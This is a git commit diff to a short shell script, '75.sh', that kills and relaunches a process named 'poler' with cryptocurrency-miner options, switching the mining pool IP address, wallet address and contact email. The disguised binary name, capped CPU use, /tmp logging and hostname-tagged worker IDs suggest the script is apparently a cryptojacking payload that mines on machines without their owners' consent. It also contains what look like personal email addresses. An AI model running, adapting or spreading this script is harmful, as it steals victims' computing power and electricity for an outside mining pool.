346103e39e684d9778bb9b8080f7759dabc63543
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-03-22 03:54:32 +0200

    Update 75.sh

--- 75.sh
+++ 75.sh
@@ -1,3 +1,3 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 51 --cpu-priority 3 -o 185.251.39.216:5987 -u 49CbkXPhxYucb9hrGevFByNd5nGQ66BmdiRUUaUdkQtY1AW3G8qVrruFFkUCuyEDjnJfbcnhCfprBH3t3Luc4tN97AvbYh3 --pass="$(hostname)":ivanovandrey1984g@gmail.com -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 51 --cpu-priority 3 -o 94.103.95.17:6026 -u 43d7tDnkhtSTX6v1JkpHnjae26tM7kCdDBZFys9zwVAdMwo3dcLyKYP67DjymbW2hc9Hz1fREGKw334YrBBka4MWHHunmiv --pass="$(hostname)":lyashko6666@gmail.com -k
